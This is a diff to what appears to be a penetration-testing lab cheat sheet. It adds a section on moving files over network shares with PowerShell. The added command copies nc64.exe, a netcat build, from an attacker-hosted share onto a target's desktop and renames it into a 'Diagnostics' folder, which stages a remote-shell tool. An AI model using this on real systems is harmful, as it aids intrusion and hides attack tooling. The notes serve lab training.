@@ -91,6 +91,16 @@ Note: You can access the share \\tsclient directly too
 ```
 
 &nbsp;
+
+**[+] Transfer files using network shares (Powershell)**
+
+```
+- You need to make a public share in your student's VM or your Kali
+
+Copy-Item –Path \\PA-USER1337\scripts\nc64.exe –Destination 'C:\Users\jumpsrvadmin\Desktop\Diagnostics\nc.exe'
+```
+
+&nbsp;
 &nbsp;
 
 ## :test_tube: Privilege escalation
